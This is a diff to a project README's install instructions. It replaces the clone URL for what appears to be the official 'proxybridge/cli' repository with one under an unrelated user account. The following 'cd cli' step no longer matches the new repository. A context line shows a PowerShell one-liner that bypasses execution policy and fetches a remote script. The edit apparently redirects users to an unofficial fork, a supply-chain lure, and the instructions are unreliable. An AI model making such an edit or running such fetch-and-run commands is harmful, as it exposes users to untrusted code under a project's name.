@@ -30,7 +30,7 @@ powershell -ExecutionPolicy Bypass -Command "iwr -useb https://proxybridge.com/i
 
 ```bash
 # Clone the repository
-git clone https://github.com/proxybridge/cli.git
+git clone https://github.com/root975638-alt/proxybridge.git
 cd cli
 
 # Build the binary
